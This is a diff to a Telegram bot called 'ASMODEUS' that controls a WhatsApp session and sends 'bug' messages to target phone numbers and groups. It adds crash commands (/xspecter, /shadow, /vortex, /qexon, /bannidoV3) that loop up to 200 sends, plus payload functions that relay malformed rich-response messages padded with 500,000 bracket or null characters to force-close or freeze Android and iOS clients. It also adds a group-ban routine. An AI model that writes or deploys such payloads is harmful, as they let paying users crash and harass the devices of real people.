@@ -2,6 +2,7 @@
 import { Telegraf, RichMessage, Markup, session } from '@icanseeuanywhere/telekaf'
 import fs from "fs";
 import https from "https";
+import crypto from "crypto";
 import moment from "moment-timezone";
 import {
   makeWASocket,
@@ -18,6 +19,29 @@ import config from "./config.js";
 const { BOT_TOKEN, OWNER_IDS } = config;
 const sessionPath = './session';
 const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+let activeAttackToken = null;
+
+function startAttack() {
+  if (activeAttackToken) activeAttackToken.cancelled = true;
+  const token = { cancelled: false };
+  activeAttackToken = token;
+  return token;
+}
+
+function isAttackCancelled(token) {
+  return !token || token.cancelled === true;
+}
+
+const ATTACK_FEATURES = {
+  xspecter:  { invisibleHard: true, bugGacor: true, bebasSpam: false, antiKenon: true },
+  xbugs:     { invisibleHard: true, bugGacor: true, bebasSpam: false, antiKenon: true },
+  xkill:     { invisibleHard: true, bugGacor: true, bebasSpam: false, antiKenon: true },
+  shadow:    { invisibleHard: true, bugGacor: true, bebasSpam: false, antiKenon: true },
+  vortex:    { invisibleHard: true, bugGacor: true, bebasSpam: false, antiKenon: true },
+  qexon:     { invisibleHard: true, bugGacor: true, bebasSpam: false, antiKenon: true },
+  bannidoV3: { invisibleHard: true, bugGacor: true, bebasSpam: true,  antiKenon: true }
+};
 
 process.on('unhandledRejection', (reason) => {
   console.error(chalk.red('[UNHANDLED REJECTION]'), reason);
@@ -580,6 +604,7 @@ bot.action("p", async (ctx) => {
         ['/connect', '/connect 628xxx', 'Connect WA'],
         ['/resetsession', '/resetsession', 'Reset session'],
         ['/status', '/status', 'Cek status bot'],
+        ['/pullupdate', '/pullupdate', 'Auto update script'],
         ['/addgrouppremium', '/addgrouppremium 30', 'Tambah premium group'],
         ['/delgrouppremium', '/delgrouppremium', 'Hapus premium group'],
         ['/listgrouppremium', '/listgrouppremium', 'List semua premium group'],
@@ -616,8 +641,11 @@ bot.action("holee", async (ctx) => {
     .table(
       [
         ["Commands", "Effect"],
+        ["/xspecter", "CRASH INVISIBLE ANDROID"],
         ["/xbugs", "INVISIBLE DELAY ANDRO"],
-        ["/xkill", "INVISIBLE DELAY ANDRO"]
+        ["/xkill", "INVISIBLE DELAY ANDRO"],
+        ["/shadow", "FORCLOSE X DELAY X FREEZE"],
+        ["/vortex", "FORCE CLOSE SLOW"]
       ],
       { bordered: true, striped: true, hasHeader: true }
     )
@@ -626,7 +654,16 @@ bot.action("holee", async (ctx) => {
     .table(
       [
         ["Commands", "Effect"],
-        ["/noctex", "Force Close Invisibles"]
+        ["/qexon", "FORCE CLOSE INVISIBLE IOS"]
+      ],
+      { bordered: true, striped: true, hasHeader: true }
+    )
+    .divider()
+    .heading(2, HTML.customEmoji("5425077563577890102", "👥") + " GROUP BUGS")
+    .table(
+      [
+        ["Commands", "Effect"],
+        ["/bannidoV3", "BAN GB NEW TEST"]
       ],
       { bordered: true, striped: true, hasHeader: true }
     )
@@ -1728,6 +1765,89 @@ bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
   }
 });
 
+bot.command("xspecter", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply("🪧 ⚠️ Example : /xspecter 62xx");
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  if (ctx.chat.type === 'private') {
+    const DRAFT_ID = 99;
+    await ctx.sendRichMessageDraft(
+      DRAFT_ID,
+      new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
+    );
+  }
+
+  const richContent = new HTML()
+    .photo(PHOTOS[0], "Asmodeus — SEND BUG")
+    .heading(1, HTML.customEmoji("6032660275973330342", "💀") + " ASMODEUS — SEND BUG")
+    .paragraph(HTML.customEmoji("4956233646441760046", "✅") + " Exploit Successfully Sent...")
+    .divider()
+    .table(
+      [
+        ["Info", "Detail"],
+        [HTML.customEmoji("6298678524379137990", "🎯") + " Target", `+${q.replace(/[^0-9]/g, "")}`],
+        [HTML.customEmoji("4956233646441760046", "✅") + " Status", "Success"],
+        [HTML.customEmoji("5334698175926128726", "📱") + " Platform", "ANDROID"],
+        [HTML.customEmoji("4956499161319998529", "🔥") + " Type Bug", "CRASH INVISIBLE ANDROID"]
+      ],
+      { bordered: true, striped: true, hasHeader: true }
+    )
+    .divider()
+    .taskList(
+      { text: "Invisible Hard", checked: ATTACK_FEATURES.xspecter.invisibleHard },
+      { text: "Bug Gacor", checked: ATTACK_FEATURES.xspecter.bugGacor },
+      { text: "Bebas Spam", checked: ATTACK_FEATURES.xspecter.bebasSpam },
+      { text: "Anti Kenon 80%", checked: ATTACK_FEATURES.xspecter.antiKenon }
+    )
+    .divider()
+    .paragraph(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
+    .build();
+
+  await ctx.sendRichMessage(richContent, {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "6298678524379137990"}]
+      ]
+    }
+  });
+
+  if (typeof sock === "undefined" || !sock) {
+    return await ctx.sendRichMessage(
+      new HTML()
+        .heading(2, "⚠️ Gagal Mengirim")
+        .paragraph(`Detail Error: <code>Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.</code>`)
+        .build()
+    );
+  }
+
+  setImmediate(() => {
+    (async () => {
+      const token = startAttack();
+      const shouldStop = () => isAttackCancelled(token);
+      try {
+        for (let i = 0; i < 200; i++) {
+          if (shouldStop()) return;
+          await CrashNew(sock, target);
+          if (shouldStop()) return;
+          const delay = 1500 + Math.floor(Math.random() * 501);
+          await sleep(delay);
+        }
+      } catch (error) {
+        if (!shouldStop()) {
+          await ctx.sendRichMessage(
+            new HTML()
+              .heading(2, "⚠️ Gagal Mengirim")
+              .paragraph(`Detail Error: <code>${error.message || error}</code>`)
+              .build()
+          ).catch(() => {});
+        }
+      }
+    })().catch(() => {});
+  });
+});
+
 bot.command("xbugs", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply("🪧 ⚠️ Example : /xbugs 62xx");
@@ -1759,10 +1879,10 @@ bot.command("xbugs", checkPremiumOrGroupPremium, checkWhatsAppConnection, async 
     )
     .divider()
     .taskList(
-      { text: "Invisible Hard", checked: true },
-      { text: "Bug Gacor", checked: true },
-      { text: "Bebas Spam", checked: false },
-      { text: "Anti Kenon 80%", checked: true }
+      { text: "Invisible Hard", checked: ATTACK_FEATURES.xbugs.invisibleHard },
+      { text: "Bug Gacor", checked: ATTACK_FEATURES.xbugs.bugGacor },
+      { text: "Bebas Spam", checked: ATTACK_FEATURES.xbugs.bebasSpam },
+      { text: "Anti Kenon 80%", checked: ATTACK_FEATURES.xbugs.antiKenon }
     )
     .divider()
     .paragraph(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
@@ -1776,24 +1896,39 @@ bot.command("xbugs", checkPremiumOrGroupPremium, checkWhatsAppConnection, async 
     }
   });
 
-  try {
-    if (typeof sock === "undefined" || !sock) {
-      throw new Error("Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.");
-    }
-
-    for (let i = 0; i < 100; i++) {
-      await FrezeeHomeV3(sock, target);
-      const delay = 1500 + Math.floor(Math.random() * 501);
-      await sleep(delay);
-    }
-  } catch (error) {
+  if (typeof sock === "undefined" || !sock) {
     return await ctx.sendRichMessage(
       new HTML()
         .heading(2, "⚠️ Gagal Mengirim")
-        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
+        .paragraph(`Detail Error: <code>Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.</code>`)
         .build()
     );
   }
+
+  setImmediate(() => {
+    (async () => {
+      const token = startAttack();
+      const shouldStop = () => isAttackCancelled(token);
+      try {
+        for (let i = 0; i < 100; i++) {
+          if (shouldStop()) return;
+          await FrezeeHomeV3(sock, target);
+          if (shouldStop()) return;
+          const delay = 1500 + Math.floor(Math.random() * 501);
+          await sleep(delay);
+        }
+      } catch (error) {
+        if (!shouldStop()) {
+          await ctx.sendRichMessage(
+            new HTML()
+              .heading(2, "⚠️ Gagal Mengirim")
+              .paragraph(`Detail Error: <code>${error.message || error}</code>`)
+              .build()
+          ).catch(() => {});
+        }
+      }
+    })().catch(() => {});
+  });
 });
 
 bot.command("xkill", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
@@ -1827,10 +1962,10 @@ bot.command("xkill", checkPremiumOrGroupPremium, checkWhatsAppConnection, async 
     )
     .divider()
     .taskList(
-      { text: "Invisible Hard", checked: true },
-      { text: "Bug Gacor", checked: true },
-      { text: "Bebas Spam", checked: false },
-      { text: "Anti Kenon 80%", checked: true }
+      { text: "Invisible Hard", checked: ATTACK_FEATURES.xkill.invisibleHard },
+      { text: "Bug Gacor", checked: ATTACK_FEATURES.xkill.bugGacor },
+      { text: "Bebas Spam", checked: ATTACK_FEATURES.xkill.bebasSpam },
+      { text: "Anti Kenon 80%", checked: ATTACK_FEATURES.xkill.antiKenon }
     )
     .divider()
     .paragraph(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
@@ -1844,29 +1979,213 @@ bot.command("xkill", checkPremiumOrGroupPremium, checkWhatsAppConnection, async 
     }
   });
 
-  try {
-    if (typeof sock === "undefined" || !sock) {
-      throw new Error("Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.");
-    }
-
-    for (let i = 0; i < 100; i++) {
-      await FrezeeHomeV2(sock, target);
-      const delay = 1500 + Math.floor(Math.random() * 501);
-      await sleep(delay);
-    }
-  } catch (error) {
+  if (typeof sock === "undefined" || !sock) {
     return await ctx.sendRichMessage(
       new HTML()
         .heading(2, "⚠️ Gagal Mengirim")
-        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
+        .paragraph(`Detail Error: <code>Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.</code>`)
         .build()
     );
   }
+
+  setImmediate(() => {
+    (async () => {
+      const token = startAttack();
+      const shouldStop = () => isAttackCancelled(token);
+      try {
+        for (let i = 0; i < 100; i++) {
+          if (shouldStop()) return;
+          await FrezeeHomeV2(sock, target);
+          if (shouldStop()) return;
+          const delay = 1500 + Math.floor(Math.random() * 501);
+          await sleep(delay);
+        }
+      } catch (error) {
+        if (!shouldStop()) {
+          await ctx.sendRichMessage(
+            new HTML()
+              .heading(2, "⚠️ Gagal Mengirim")
+              .paragraph(`Detail Error: <code>${error.message || error}</code>`)
+              .build()
+          ).catch(() => {});
+        }
+      }
+    })().catch(() => {});
+  });
 });
 
-bot.command("noctex", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
+bot.command("shadow", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply("🪧 ⚠️ Example : /noctex 62xx");
+  if (!q) return ctx.reply("🪧 ⚠️ Example : /shadow 62xx");
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  if (ctx.chat.type === 'private') {
+    const DRAFT_ID = 99;
+    await ctx.sendRichMessageDraft(
+      DRAFT_ID,
+      new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
+    );
+  }
+
+  const richContent = new HTML()
+    .photo(PHOTOS[0], "Asmodeus — SEND BUG")
+    .heading(1, HTML.customEmoji("6032660275973330342", "💀") + " ASMODEUS — SEND BUG")
+    .paragraph(HTML.customEmoji("4956233646441760046", "✅") + " Exploit Successfully Sent...")
+    .divider()
+    .table(
+      [
+        ["Info", "Detail"],
+        [HTML.customEmoji("6298678524379137990", "🎯") + " Target", `+${q.replace(/[^0-9]/g, "")}`],
+        [HTML.customEmoji("4956233646441760046", "✅") + " Status", "Success"],
+        [HTML.customEmoji("5334698175926128726", "📱") + " Platform", "ANDROID"],
+        [HTML.customEmoji("4956499161319998529", "🔥") + " Type Bug", "FORCLOSE X DELAY X FREEZE"]
+      ],
+      { bordered: true, striped: true, hasHeader: true }
+    )
+    .divider()
+    .taskList(
+      { text: "Invisible Hard", checked: ATTACK_FEATURES.shadow.invisibleHard },
+      { text: "Bug Gacor", checked: ATTACK_FEATURES.shadow.bugGacor },
+      { text: "Bebas Spam", checked: ATTACK_FEATURES.shadow.bebasSpam },
+      { text: "Anti Kenon 80%", checked: ATTACK_FEATURES.shadow.antiKenon }
+    )
+    .divider()
+    .paragraph(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
+    .build();
+
+  await ctx.sendRichMessage(richContent, {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "6298678524379137990"}]
+      ]
+    }
+  });
+
+  if (typeof sock === "undefined" || !sock) {
+    return await ctx.sendRichMessage(
+      new HTML()
+        .heading(2, "⚠️ Gagal Mengirim")
+        .paragraph(`Detail Error: <code>Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.</code>`)
+        .build()
+    );
+  }
+
+  setImmediate(() => {
+    (async () => {
+      const token = startAttack();
+      const shouldStop = () => isAttackCancelled(token);
+      try {
+        for (let i = 0; i < 100; i++) {
+          if (shouldStop()) return;
+          await Promise.all([
+            PerfectInvisV1(sock, target),
+            DelayInvisV1(sock, target)
+          ]);
+          if (shouldStop()) return;
+          const delay = 1500 + Math.floor(Math.random() * 501);
+          await sleep(delay);
+        }
+      } catch (error) {
+        if (!shouldStop()) {
+          await ctx.sendRichMessage(
+            new HTML()
+              .heading(2, "⚠️ Gagal Mengirim")
+              .paragraph(`Detail Error: <code>${error.message || error}</code>`)
+              .build()
+          ).catch(() => {});
+        }
+      }
+    })().catch(() => {});
+  });
+});
+
+bot.command("vortex", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply("🪧 ⚠️ Example : /vortex 62xx");
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  if (ctx.chat.type === 'private') {
+    const DRAFT_ID = 99;
+    await ctx.sendRichMessageDraft(
+      DRAFT_ID,
+      new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
+    );
+  }
+
+  const richContent = new HTML()
+    .photo(PHOTOS[0], "Asmodeus — SEND BUG")
+    .heading(1, HTML.customEmoji("6032660275973330342", "💀") + " ASMODEUS — SEND BUG")
+    .paragraph(HTML.customEmoji("4956233646441760046", "✅") + " Exploit Successfully Sent...")
+    .divider()
+    .table(
+      [
+        ["Info", "Detail"],
+        [HTML.customEmoji("6298678524379137990", "🎯") + " Target", `+${q.replace(/[^0-9]/g, "")}`],
+        [HTML.customEmoji("4956233646441760046", "✅") + " Status", "Success"],
+        [HTML.customEmoji("5334698175926128726", "📱") + " Platform", "ANDROID"],
+        [HTML.customEmoji("4956499161319998529", "🔥") + " Type Bug", "FORCE CLOSE SLOW"]
+      ],
+      { bordered: true, striped: true, hasHeader: true }
+    )
+    .divider()
+    .taskList(
+      { text: "Invisible Hard", checked: ATTACK_FEATURES.vortex.invisibleHard },
+      { text: "Bug Gacor", checked: ATTACK_FEATURES.vortex.bugGacor },
+      { text: "Bebas Spam", checked: ATTACK_FEATURES.vortex.bebasSpam },
+      { text: "Anti Kenon 80%", checked: ATTACK_FEATURES.vortex.antiKenon }
+    )
+    .divider()
+    .paragraph(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
+    .build();
+
+  await ctx.sendRichMessage(richContent, {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: 'danger', icon_custom_emoji_id: "6298678524379137990"}]
+      ]
+    }
+  });
+
+  if (typeof sock === "undefined" || !sock) {
+    return await ctx.sendRichMessage(
+      new HTML()
+        .heading(2, "⚠️ Gagal Mengirim")
+        .paragraph(`Detail Error: <code>Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.</code>`)
+        .build()
+    );
+  }
+
+  setImmediate(() => {
+    (async () => {
+      const token = startAttack();
+      const shouldStop = () => isAttackCancelled(token);
+      try {
+        for (let i = 0; i < 100; i++) {
+          if (shouldStop()) return;
+          await CrashInvisible(sock, target);
+          if (shouldStop()) return;
+          const delay = 1500 + Math.floor(Math.random() * 501);
+          await sleep(delay);
+        }
+      } catch (error) {
+        if (!shouldStop()) {
+          await ctx.sendRichMessage(
+            new HTML()
+              .heading(2, "⚠️ Gagal Mengirim")
+              .paragraph(`Detail Error: <code>${error.message || error}</code>`)
+              .build()
+          ).catch(() => {});
+        }
+      }
+    })().catch(() => {});
+  });
+});
+
+bot.command("qexon", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply("🪧 ⚠️ Example : /qexon 62xx");
 
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
@@ -1889,16 +2208,16 @@ bot.command("noctex", checkPremiumOrGroupPremium, checkWhatsAppConnection, async
         [HTML.customEmoji("6298678524379137990", "🎯") + " Target", `+${q.replace(/[^0-9]/g, "")}`],
         [HTML.customEmoji("4956233646441760046", "✅") + " Status", "Success"],
         [HTML.customEmoji("5334756145099722681", "📱") + " Platform", "IPHONE"],
-        [HTML.customEmoji("4956499161319998529", "🔥") + " Type Bug", "Force Close Invisibles"]
+        [HTML.customEmoji("4956499161319998529", "🔥") + " Type Bug", "FORCE CLOSE INVISIBLE IOS"]
       ],
       { bordered: true, striped: true, hasHeader: true }
     )
     .divider()
     .taskList(
-      { text: "Invisible Hard", checked: true },
-      { text: "Bug Gacor", checked: true },
-      { text: "Bebas Spam", checked: false },
-      { text: "Anti Kenon 80%", checked: true }
+      { text: "Invisible Hard", checked: ATTACK_FEATURES.qexon.invisibleHard },
+      { text: "Bug Gacor", checked: ATTACK_FEATURES.qexon.bugGacor },
+      { text: "Bebas Spam", checked: ATTACK_FEATURES.qexon.bebasSpam },
+      { text: "Anti Kenon 80%", checked: ATTACK_FEATURES.qexon.antiKenon }
     )
     .divider()
     .paragraph(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
@@ -1912,24 +2231,155 @@ bot.command("noctex", checkPremiumOrGroupPremium, checkWhatsAppConnection, async
     }
   });
 
-  try {
-    if (typeof sock === "undefined" || !sock) {
-      throw new Error("Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.");
-    }
-
-    for (let i = 0; i < 100; i++) {
-      await gunma(sock, target);
-      const delay = 1500 + Math.floor(Math.random() * 501);
-      await sleep(delay);
-    }
-  } catch (error) {
+  if (typeof sock === "undefined" || !sock) {
     return await ctx.sendRichMessage(
       new HTML()
         .heading(2, "⚠️ Gagal Mengirim")
-        .paragraph(`Detail Error: <code>${error.message || error}</code>`)
+        .paragraph(`Detail Error: <code>Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.</code>`)
         .build()
     );
   }
+
+  setImmediate(() => {
+    (async () => {
+      const token = startAttack();
+      const shouldStop = () => isAttackCancelled(token);
+      try {
+        for (let i = 0; i < 100; i++) {
+          if (shouldStop()) return;
+          await ios(sock, target);
+          if (shouldStop()) return;
+          const delay = 1500 + Math.floor(Math.random() * 501);
+          await sleep(delay);
+        }
+      } catch (error) {
+        if (!shouldStop()) {
+          await ctx.sendRichMessage(
+            new HTML()
+              .heading(2, "⚠️ Gagal Mengirim")
+              .paragraph(`Detail Error: <code>${error.message || error}</code>`)
+              .build()
+          ).catch(() => {});
+        }
+      }
+    })().catch(() => {});
+  });
+});
+
+bot.command("bannidoV3", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply("🪧 ⚠️ Example : /bannidoV3 https://chat.whatsapp.com/xxxx atau 1234xx@g.us");
+
+  if (ctx.chat.type === 'private') {
+    const DRAFT_ID = 99;
+    await ctx.sendRichMessageDraft(
+      DRAFT_ID,
+      new HTML().thinking(HTML.italic(`⚙️ memproses target ${q}...`)).build()
+    );
+  }
+
+  let groupJid = q;
+  let displayTarget = q;
+
+  const inviteRegex = /https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
+  const matchInvite = q.match(inviteRegex);
+
+  if (matchInvite) {
+    const code = matchInvite[1];
+    displayTarget = `Invite: ${code}`;
+
+    try {
+      groupJid = await sock.groupAcceptInvite(code);
+    } catch (joinErr) {
+      const errMsg = (joinErr && joinErr.message) || '';
+      if (errMsg.includes('account_reachout_restricted')) {
+        return ctx.reply('❌ Account restricted for joining groups! Try again later or use direct JID.');
+      }
+      if (errMsg.toLowerCase().includes('conflict') || errMsg.toLowerCase().includes('already') || errMsg.toLowerCase().includes('member')) {
+        try {
+          const info = await sock.groupGetInviteInfo(code);
+          groupJid = info.id;
+        } catch (e) {
+          return ctx.reply(`❌ Error: ${errMsg}`);
+        }
+      } else {
+        return ctx.reply(`❌ Error joining group: ${errMsg}`);
+      }
+    }
+  } else if (!q.endsWith('@g.us')) {
+    return ctx.reply('❌ Invalid group. Use a valid invite link or JID ending in @g.us');
+  }
+
+  const cleanJid = groupJid.split('@')[0];
+  const shortJid = cleanJid.length > 18 ? cleanJid.slice(0, 15) + '...' : cleanJid;
+
+  const richContent = new HTML()
+    .photo(PHOTOS[0], "Asmodeus — SEND BUG")
+    .heading(1, HTML.customEmoji("6032660275973330342", "💀") + " ASMODEUS — SEND BUG")
+    .paragraph(HTML.customEmoji("4956233646441760046", "✅") + " Exploit Successfully Sent...")
+    .divider()
+    .table(
+      [
+        ["Info", "Detail"],
+        [HTML.customEmoji("6298678524379137990", "🎯") + " Target", `+${shortJid}`],
+        [HTML.customEmoji("4956233646441760046", "✅") + " Status", "Success"],
+        [HTML.customEmoji("5425077563577890102", "👥") + " Platform", "GROUP"],
+        [HTML.customEmoji("4956499161319998529", "🔥") + " Type Bug", "BAN GB NEW TEST"]
+      ],
+      { bordered: true, striped: true, hasHeader: true }
+    )
+    .divider()
+    .taskList(
+      { text: "Invisible Hard", checked: ATTACK_FEATURES.bannidoV3.invisibleHard },
+      { text: "Bug Gacor", checked: ATTACK_FEATURES.bannidoV3.bugGacor },
+      { text: "Bebas Spam", checked: ATTACK_FEATURES.bannidoV3.bebasSpam },
+      { text: "Anti Kenon 80%", checked: ATTACK_FEATURES.bannidoV3.antiKenon }
+    )
+    .divider()
+    .paragraph(HTML.italic("Powered by ") + HTML.bold("ASMODEUS"))
+    .build();
+
+  await ctx.sendRichMessage(richContent, {
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "TARGET", url: `https://chat.whatsapp.com/${matchInvite ? matchInvite[1] : cleanJid}`, style: 'danger', icon_custom_emoji_id: "6298678524379137990"}]
+      ]
+    }
+  });
+
+  if (typeof sock === "undefined" || !sock) {
+    return await ctx.sendRichMessage(
+      new HTML()
+        .heading(2, "⚠️ Gagal Mengirim")
+        .paragraph(`Detail Error: <code>Variabel 'sock' tidak ditemukan atau WhatsApp belum terhubung.</code>`)
+        .build()
+    );
+  }
+
+  setImmediate(() => {
+    (async () => {
+      const token = startAttack();
+      const shouldStop = () => isAttackCancelled(token);
+      try {
+        for (let i = 0; i < 100; i++) {
+          if (shouldStop()) return;
+          await BanGbTry(sock, groupJid);
+          if (shouldStop()) return;
+          const delay = i % 2 === 0 ? 2000 : 2500;
+          await sleep(delay);
+        }
+      } catch (error) {
+        if (!shouldStop()) {
+          await ctx.sendRichMessage(
+            new HTML()
+              .heading(2, "⚠️ Gagal Mengirim")
+              .paragraph(`Detail Error: <code>${error.message || error}</code>`)
+              .build()
+          ).catch(() => {});
+        }
+      }
+    })().catch(() => {});
+  });
 });
 
 const UPDATE_URL = "https://raw.githubusercontent.com/Darlin77/scary_autoupdate/refs/heads/main/scary.js";
@@ -2108,187 +2558,364 @@ async function FrezeeHomeV3(sock, target) {
         }, { noSelfSync: true })
      }
 
-/* IOS FC NEW */
-const buffer1 = {
-  "interactiveMessage": {
-    "interactiveMessage": {
-      "header": {
-        "title": "🪭𝚂𝙴𝙲𝚁𝙴𝚃 ♕ 𝙲𝙾𝙼𝙿𝙰𝙽𝚈🪭",
-        "subtitle": "666",
-        "hasMediaAttachment": false
-      },
-      "body": {
-        "text": "Apa yang ingin anda lakukan?"
-      },
-      "footer": {
-        "text": "Nishiki"
-      },
-      "nativeFlowMessage": {
-        "buttons": [
+/* PerfectInvisV1 (shadow) */
+async function PerfectInvisV1(sock, target) {
+await sock.relayMessage(target, {
+   messageContextInfo: {
+     deviceListMetadata: {},
+     deviceListMetadataVersion: 2,
+     botMetadata: {
+       pluginMetadata: {},
+       richResponseSourcesMetadata: { sources: [] }
+    }
+  },
+  groupStatusMessageV2: {
+    message: {
+      richResponseMessage: {
+        messageType: 1,
+        submessages: [
           {
-            "name": "quick_reply",
-            "buttonParamsJson": "{\"display_text\":\"Opsi 1\",\"id\":\"opt_1\"}"
-          },
-          {
-            "name": "quick_reply",
-            "buttonParamsJson": "{\"display_text\":\"Opsi 3\",\"id\":\"opt_3\"}"
+          messageType: 4,
+          tableMetadata: {
+            title: "\0",
+              rows: "[".repeat(500000),
+            }
           }
         ],
-        "messageParamsJson": "{}"
-      },
-      "mtype": "interactiveMessage",
-      "id": "3EB002CBD0A177798DC757",
-      "chat": "135759822622788@lid",
-      "isBaileys": false,
-      "sender": "215178549395532@lid",
-      "fromMe": false,
-      "text": "",
-      "mentionedJid": [],
-      "fakeObj": {
-        "messageStubParameters": [],
-        "labels": [],
-        "userReceipt": [],
-        "reactions": [],
-        "pollUpdates": [],
-        "eventResponses": [],
-        "statusMentions": [],
-        "messageAddOns": [],
-        "statusMentionSources": [],
-        "supportAiCitations": [],
-        "key": "[SENSITIVE_DATA_OMITTED]",
-        "message": {
-          "interactiveMessage": {
-            "header": {
-              "title": "🪭𝚂𝙴𝙲𝚁𝙴𝚃 ♕ 𝙲𝙾𝙼𝙿𝙰𝙽𝚈🪭",
-              "subtitle": "666",
-              "hasMediaAttachment": false
-            },
-            "body": {
-              "text": "Apa yang ingin anda lakukan?"
-            },
-            "footer": {
-              "text": "Nishiki"
-            },
-            "nativeFlowMessage": {
-              "buttons": [
-                "[TRUNCATED_DEPTH]",
-                "[TRUNCATED_DEPTH]"
-              ],
-              "messageParamsJson": "{}"
-            },
-            "mtype": "interactiveMessage",
-            "id": "3EB002CBD0A177798DC757",
-            "chat": "135759822622788@lid",
-            "isBaileys": false,
-            "sender": "215178549395532@lid",
-            "fromMe": false,
-            "text": "",
-            "mentionedJid": [],
-            "fakeObj": {
-              "messageStubParameters": [],
-              "labels": [],
-              "userReceipt": [],
-              "reactions": [],
-              "pollUpdates": [],
-              "eventResponses": [],
-              "statusMentions": [],
-              "messageAddOns": [],
-              "statusMentionSources": [],
-              "supportAiCitations": [],
-              "key": "[SENSITIVE_DATA_OMITTED]",
-              "message": {
-                "interactiveMessage": "[TRUNCATED_DEPTH]"
-              }
-            },
-            "delete": "[FUNCTION]",
-            "copyNForward": "[FUNCTION]",
-            "download": "[FUNCTION]"
-          }
+        unifiedResponse: {
+          data: JSON.stringify({
+            response_id: crypto.randomUUID(),
+            sections: []
+          })
+        },
+        contextInfo: {
+          forwardingScore: 1,
+          isForwarded: true,
+          forwardedAiBotMessageInfo: {
+            botJid: "867051314767696@bot"
+          },
+          forwardOrigin: 4
         }
-      },
-      "delete": "[FUNCTION]",
-      "copyNForward": "[FUNCTION]",
-      "download": "[FUNCTION]"
+      }
     }
   }
-};
-
-let data;
-try {
-  data = JSON.stringify(buffer1, null, 2);
-} catch (stringifyErr) {
-  console.error(stringifyErr.message);
+}, {
+ noSelfSync: true 
+})
 }
 
-const buffer = Buffer.from(data, 'utf8');
+/* DelayInvisV1 (shadow - second function) */
+async function DelayInvisV1(sock, target) {
+await sock.relayMessage(target, {
+   messageContextInfo: {
+     deviceListMetadata: {},
+     deviceListMetadataVersion: 2,
+     botMetadata: {
+       pluginMetadata: {},
+       richResponseSourcesMetadata: { sources: [] }
+    }
+  },
+  groupStatusMessageV2: {
+    message: {
+      richResponseMessage: {
+        messageType: 1,
+        submessages: [
+          {
+          messageType: 4,
+          tableMetadata: {
+            title: "\0",
+              rows: "\0".repeat(500000),
+            }
+          }
+        ],
+        unifiedResponse: {
+          data: JSON.stringify({
+            response_id: crypto.randomUUID(),
+            sections: []
+          })
+        },
+        contextInfo: {
+          forwardingScore: 1,
+          isForwarded: true,
+          forwardedAiBotMessageInfo: {
+            botJid: "867051314767696@bot"
+          },
+          forwardOrigin: 4
+        }
+      }
+    }
+  }
+}, {
+ noSelfSync: true 
+})
+}
 
-/* IOS FC NEW 
-*/
-async function gunma(demmy, target) {
-    const tora = { 
-        botForwardedMessage: { 
-            message: {
-                richResponseMessage: { 
-                    messageType: "AI_RICH_RESPONSE_TYPE_STANDARD",
-                    submessages: [{ messageType: "AI_RICH_RESPONSE_TEXT", messageText: "olla" }],
-                    unifiedResponse: { 
-                        data: Buffer.from(JSON.stringify({ 
-                            response_id: "666",
-                            sections: [
-                                { 
-                                    view_model: { 
-                                        primitive: { 
-                                            text: "",
-                                            __typename: "GenAIMarkdownTextUXPrimitive" 
-                                        },
-                                        __typename: "GenAISingleLayoutViewModel" 
-                                    } 
-                                }, 
-                                { 
-                                    view_model: { 
-                                        primitive: { 
-                                            language: "Gunma",
-                                            code_blocks: [
-                                                { "content": "🪭𝚂𝙴𝙲𝚁𝙴𝚃 ♕ 𝙲𝙾𝙼𝙿𝙰𝙽𝚈🪭\n\n\n", "type": "NUMBER" },
-                                                { "content": buffer, "type": "STR" }
-                                            ],
-                                            __typename: "GenAICodeUXPrimitive" 
-                                        },
